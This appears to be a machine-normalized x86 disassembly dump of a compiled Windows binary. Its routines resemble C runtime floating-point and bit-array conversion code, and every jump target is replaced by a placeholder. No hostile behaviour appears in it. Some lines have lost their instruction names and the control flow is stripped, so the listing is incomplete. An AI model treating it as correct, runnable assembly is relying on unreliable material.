jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_40e72d
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_413290
inc eax
push eax
push edi
push esi
call sub_40ba70
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_420bf3
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_420ca6
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_420bf3
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_422fa0
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_419700
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e6c1
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
sub_420d40
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_420e20
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_420e3f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_42431f
call sub_42431f
mov [ esi ] eax
jmp r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_42431f
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_420e9e
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
lea ecx [ edx + esi ]
xor eax eax
cmp ecx edx
jb r-xdata
xor eax eax
inc eax
cmp ecx esi
jae r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
pop esi
pop ebp
retn
sub_420ec2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
mov edx [ ebp + 0xc ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
sub ecx edx
or edx 0xffffffff
shl edx cl
mov ecx [ ebp + 0x8 ]
not edx
test [ ecx + eax * 4 ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
inc eax
cmp eax 0x3
jl r-xdata
xor eax eax
pop ebp
retn
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_420f0b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
mov edx [ ebp + 0xc ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
mov edi [ ebp + 0x8 ]
sub ecx edx
xor edx edx
inc edx
shl edx cl
mov ecx [ edi + eax * 4 ]
xor ebx ebx
lea esi [ ecx + edx ]
cmp esi ecx
jb r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor ebx ebx
inc ebx
cmp esi edx
jae r-xdata
dec eax
jns r-xdata
mov [ edi + eax * 4 ] esi
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
mov ecx [ edi + eax * 4 ]
lea edx [ ecx + 0x1 ]
xor ebx ebx
cmp edx ecx
jb r-xdata
xor ebx ebx
inc ebx
cmp edx 0x1
jae r-xdata
mov [ edi + eax * 4 ] edx
sub_420f78
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
lea ebx [ edx + eax ]
lea eax [ edi + 0x1 ]
sar ebx 0x5
and eax 0x8000001f
jns r-xdata
mov esi [ ebp + 0x8 ]
push 0x1f
pop ecx
sub ecx eax
xor eax eax
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ esi + ebx * 4 ] eax
je r-xdata
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi + ebx * 4 ] eax
inc ebx
cmp ebx ecx
jge r-xdata
or edx 0xffffffff
shl edx cl
mov eax ebx
not edx
test [ esi + eax * 4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
sub ecx ebx
lea edi [ esi + ebx * 4 ]
xor eax eax
[ edi ]
jne r-xdata
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
and [ ebp + 0xc ] 0x0
xor edx edx
sub ecx edi
inc edx
shl edx cl
mov ecx [ esi + eax * 4 ]
lea edi [ ecx + edx ]
cmp edi ecx
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ esi + eax * 4 ] 0x0
jmp r-xdata
mov [ ebp + 0xc ] 0x1
cmp edi edx
jae r-xdata
dec eax
jns r-xdata
mov ecx [ ebp + 0xc ]
mov [ esi + eax * 4 ] edi
jmp r-xdata
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] ecx
mov ecx [ esi + eax * 4 ]
lea edx [ ecx + 0x1 ]
xor edi edi
cmp edx ecx
jb r-xdata
xor edi edi
inc edi
cmp edx 0x1
jae r-xdata
mov [ esi + eax * 4 ] edx
mov ecx edi
sub_421064
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push 0x3
pop edx
sub ecx eax
push esi
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
pop ebp
retn
sub_421094
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_4210b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
and edx 0x1f
sub esp 0xc
add eax edx
mov edx [ ebp + 0xc ]
push esi
sar eax 0x5
and edx 0x8000001f
push edi
jns r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp + 0xc ] 0x0
mov edi [ ebp + 0x8 ]
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
push ebx
not esi
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp + 0xc ]
mov ebx [ edi + ecx * 4 ]
and ebx esi
mov [ ebp - 0xc ] ebx
mov ebx [ edi + ecx * 4 ]
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0xc ]
or ebx [ ebp - 0x8 ]
mov [ edi + ecx * 4 ] ebx
mov ebx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
shl ebx cl
inc [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x3
mov [ ebp - 0x8 ] ebx
jl r-xdata
push 0x2
pop ecx
mov edx ecx
sub edx eax
lea edx [ edi + edx * 4 ]
pop ebx
and [ edi + ecx * 4 ] 0x0
mov esi [ edx ]
mov [ edi + ecx * 4 ] esi
jmp r-xdata
cmp ecx eax
jl r-xdata
pop edi
pop esi
leave
retn
sub edx 0x4
dec ecx
jns r-xdata
sub_42114b
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x38 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
and ecx 0x8000
mov [ ebp - 0x3c ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
push ebx
mov ebx [ ebp + 0x10 ]
and edx 0x7fff
sub edx 0x3fff
shl eax 0x10
push esi
push edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
and [ ebp - 0x30 ] 0x0
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax edx
movsd [ edi ] [ esi ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x28 ] eax
jns r-xdata
xor esi esi
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x34 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x34 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
cmp [ ebp + eax * 4 - 0x10 ] esi
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
push 0x1f
pop ecx
sub ecx [ ebx + 0xc ]
mov ebx [ ebx + 0x10 ]
shl esi cl
mov ecx [ ebp - 0x3c ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0x10 ]
cmp ebx 0x40
jne r-xdata
xor eax eax
mov eax [ ebx + 0x4 ]
mov ecx [ ebp - 0x20 ]
mov edx eax
sub edx [ ebx + 0x8 ]
cmp ecx edx
jge r-xdata
inc [ ebp - 0x20 ]
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
cmp ebx 0x20
jne r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
cmp ecx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x30 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x24 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x24 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
mov ecx [ ebp - 0x38 ]
mov [ ecx ] esi
cmp ecx [ ebx ]
mov ecx [ ebx + 0xc ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx eax
cdq
and edx 0x1f
movsd [ edi ] [ esi ]
lea esi [ edx + eax ]
mov edx ecx
sar esi 0x5
and edx 0x8000001f
jns r-xdata
xor esi esi
mov [ ebp - 0x30 ] 0x1
cmp [ ebp - 0x24 ] edx
jmp r-xdata
mov esi [ ebx + 0x14 ]
add esi [ ebp - 0x20 ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x34 ] eax
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or eax 0xffffffff
mov ecx edx
shl eax cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not eax
dec edx
or edx 0xffffffe0
inc edx
test ecx ecx
je r-xdata
mov [ ebp - 0x30 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx eax
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov edx esi
push 0x2
shl edx 0x2
lea eax [ ebp - 0x8 ]
pop ecx
sub eax edx
and [ ebp - 0x30 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x24 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x24 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x30 ]
jns r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ ebp + eax * 4 - 0x10 ]
mov ecx eax
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr eax cl
mov ecx [ ebp - 0x20 ]
or eax [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl eax cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] eax
jl r-xdata
mov edx [ ebp - 0x34 ]
mov edi edx
push 0x2
shl edi 0x2
lea eax [ ebp - 0x8 ]
pop ecx
sub eax edi
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + ecx * 4 - 0x10 ] 0x0
mov edx [ eax ]
mov [ ebp + ecx * 4 - 0x10 ] edx
jmp r-xdata
cmp edi 0x1
and [ ebp + ecx * 4 - 0x10 ] 0x0
mov edi [ eax ]
mov [ ebp + ecx * 4 - 0x10 ] edi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp ecx esi
jl r-xdata
mov edi [ ebx + 0x8 ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] eax
jns r-xdata
sub eax 0x4
dec ecx
jns r-xdata
cmp ecx edx
jl r-xdata
sub eax 0x4
dec ecx
jns r-xdata
cmp edx eax
jl r-xdata
mov esi [ ebx + 0x14 ]
add esi [ ebx ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
mov [ ebp - 0x34 ] ecx
test [ ebp + eax * 4 - 0x10 ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x34 ]
or edx 0xffffffff
shl edx cl
push 0x3
pop ecx
and [ ebp + eax * 4 - 0x10 ] edx
inc eax
cmp eax ecx
jge r-xdata
or esi 0xffffffff
shl esi cl
mov edx eax
not esi
test [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov ecx [ ebx + 0xc ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
lea esi [ edx + eax ]
lea edx [ ecx + 0x1 ]
sar esi 0x5
and edx 0x8000001f
jns r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or eax 0xffffffff
mov ecx edx
shl eax cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not eax
dec edx
or edx 0xffffffe0
inc edx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx 0x3
jl r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx eax
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov edx esi
push 0x2
shl edx 0x2
lea eax [ ebp - 0x8 ]
pop ecx
sub eax edx
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx edi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
lea esi [ edi + edx ]
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + ecx * 4 - 0x10 ] 0x0
mov edx [ eax ]
mov [ ebp + ecx * 4 - 0x10 ] edx
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp esi edx
jae r-xdata
cmp ecx esi
jl r-xdata
sub eax 0x4
dec ecx
jns r-xdata
dec eax
jns r-xdata
mov edx [ ebp - 0x24 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x2c ]
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_42169a
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rwxdata ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rwxdata ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rwxdata ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rwxdata ]
mov ecx eax
sub ecx [ rwxdata ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rwxdata ]
cmp ebx [ rwxdata ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rwxdata ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
